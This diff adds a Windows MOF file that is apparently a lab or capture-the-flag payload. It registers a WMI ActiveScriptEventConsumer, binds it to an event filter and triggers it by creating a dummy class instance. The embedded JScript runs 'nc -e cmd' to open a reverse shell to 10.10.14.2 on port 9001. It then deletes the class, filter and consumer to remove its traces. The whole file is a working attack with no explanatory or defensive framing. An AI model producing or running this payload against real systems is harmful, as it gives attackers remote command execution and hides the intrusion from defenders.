@@ -1,0 +1,52 @@
+#pragma namespace("\\\\.\\root\\cimv2")
+class MyClass48475
+{
+        [key] string Name;
+};
+
+class ActiveScriptEventConsumer : __EventConsumer
+{
+        [key] string Name;
+        [not_null] string ScriptingEngine;
+        string ScriptFileName;
+        [template] string ScriptText;
+  uint32 KillTimeout;
+};
+
+instance of __Win32Provider as $P
+{
+    Name  = "ActiveScriptEventConsumer";
+    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
+    PerUserInitialization = TRUE;
+};
+
+instance of __EventConsumerProviderRegistration
+{
+  Provider = $P;
+  ConsumerClassNames = {"ActiveScriptEventConsumer"};
+};
+
+Instance of ActiveScriptEventConsumer as $cons
+{
+  Name = "ASEC";
+  ScriptingEngine = "JScript";
+  ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"nc -e cmd 10.10.14.2 9001\");} catch (err) {};\nsv = GetObject(\"winmgmts:root\\\\cimv2\");try {sv.Delete(\"MyClass48475\");} catch (err) {};try {sv.Delete(\"__EventFilter.Name='instfilt'\");} catch (err) {};try {sv.Delete(\"ActiveScriptEventConsumer.Name='ASEC'\");} catch(err) {};";
+};
+
+instance of __EventFilter as $Filt
+{
+  Name = "instfilt";
+  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClass48475\"";
+  QueryLanguage = "WQL";
+};
+
+instance of __FilterToConsumerBinding as $bind
+{
+  Consumer = $cons;
+  Filter = $Filt;
+};
+
+instance of MyClass48475 as $MyClass
+{
+  Name = "ClassConsumer";
+};
